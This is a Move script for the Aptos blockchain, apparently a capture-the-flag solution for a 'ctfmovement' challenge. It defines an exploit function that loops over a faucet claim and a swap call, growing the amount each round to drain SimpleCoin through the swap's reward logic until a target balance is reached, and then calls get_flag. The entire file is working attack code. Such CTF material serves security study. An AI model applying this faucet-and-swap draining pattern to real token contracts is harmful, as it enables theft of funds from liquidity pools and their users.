script {
	use std::signer;
	use std::string::{String, utf8};

	use aptos_framework::debug;
	use aptos_framework::coin::{Self};
	use ctfmovement::math::{Self};

	use ctfmovement::simple_coin::{Self, SimpleCoin, TestUSDC};
	use ctfmovement::swap;

	fun exploit(attacker: &signer) {
		let targetnum = math::pow(10u128, 10u8) as u64;
		let amount = targetnum;
		let usdc_balance;
		let coin_balance;

		loop {
			simple_coin::claim_faucet(attacker, amount);

			usdc_balance = coin::balance<TestUSDC>(signer::address_of(attacker));
			
			let testusdc = coin::withdraw<TestUSDC>(attacker, usdc_balance);
			let (simple_coin, reward) = swap::swap_exact_y_to_x_direct<SimpleCoin, TestUSDC>(testusdc);

			coin::merge<SimpleCoin>(&mut simple_coin, reward);
			coin::deposit<SimpleCoin>(signer::address_of(attacker), simple_coin);

			usdc_balance = coin::balance<TestUSDC>(signer::address_of(attacker));
			coin_balance = coin::balance<SimpleCoin>(signer::address_of(attacker));
			// debug::print(&coin_balance);
			// debug::print(&targetnum);
			// debug::print(&amount);

			if (coin_balance >= targetnum) {
				break
			};

			amount = amount * 3;
		};
		
		let msg: String = utf8(b"== usdc balance ==");
		debug::print(&msg);
		debug::print(&usdc_balance);

		let msg: String = utf8(b"== coin balance ==");
		debug::print(&msg);
		debug::print(&coin_balance);

		let msg: String = utf8(b"== target number ==");
		debug::print(&msg);
		debug::print(&targetnum);

		assert!(coin_balance >= targetnum, 404);

		simple_coin::get_flag(attacker);

		let success: String = utf8(b"exploit success");
		debug::print(&success);
	}
}
